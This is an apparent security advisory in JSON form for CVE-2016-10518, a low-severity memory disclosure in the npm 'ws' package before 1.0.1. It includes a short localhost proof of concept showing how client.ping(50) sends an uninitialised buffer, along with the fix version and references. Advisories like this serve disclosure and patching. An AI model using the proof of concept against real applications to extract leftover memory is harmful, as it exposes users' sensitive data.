{
    "Title": "Remote Memory Disclosure in ws",
    "Meta": {
        "Package": [
            "ws([npm](/advisories?query=ecosystem%3Anpm))"
        ],
        "Affected versions": [
            "< 1.0.1"
        ],
        "Patched versions": [
            "1.0.1"
        ]
    },
    "Description": "Versions of `ws` prior to 1.0.1 are affected by a remote memory disclosure\nvulnerability.\n\nIn certain rare circumstances, applications which allow users to control the\narguments of a `client.ping()` call will cause `ws` to send the contents of an\nallocated but non-zero-filled buffer to the server. This may disclose\nsensitive information that still exists in memory after previous use of the\nmemory for other tasks.\n\n## Proof of Concept\n\n    \n    \n    var ws = require('ws')\n    \n    var server = new ws.Server({ port: 9000 })\n    var client = new ws('ws://localhost:9000')\n    \n    client.on('open', function () {\n      console.log('open')\n      client.ping(50) // this sends a non-zeroed buffer of 50 bytes\n    \n      client.on('pong', function (data) {\n        console.log('got pong')\n        console.log(data) // Data from the client. \n      })\n    })\n    \n\n## Recommendation\n\nUpdate to version 1.0.1 or greater.\n\n### References\n\n  * <https://nvd.nist.gov/vuln/detail/CVE-2016-10518>\n  * <https://gist.github.com/c0nrad/e92005446c480707a74a>\n  * [GHSA-2mhh-w6q8-5hxw](https://github.com/advisories/GHSA-2mhh-w6q8-5hxw \"GHSA-2mhh-w6q8-5hxw\")\n  * <https://github.com/websockets/ws/releases/tag/1.0.1>\n  * <https://www.npmjs.com/advisories/67>\n  * [websockets/ws@`29293ed`](https://github.com/websockets/ws/commit/29293ed11b679e0366fa0f6bb9310b330dafd795)\n\n",
    "Severity": {
        "Score": "(Low)"
    },
    "Weaknesses": [
        "[CWE-201](/advisories?query=cwe%3A201)"
    ],
    "CVE ID": "CVE-2016-10518",
    "GHSA ID": "GHSA-2mhh-w6q8-5hxw",
    "Source code": "No known source code"
}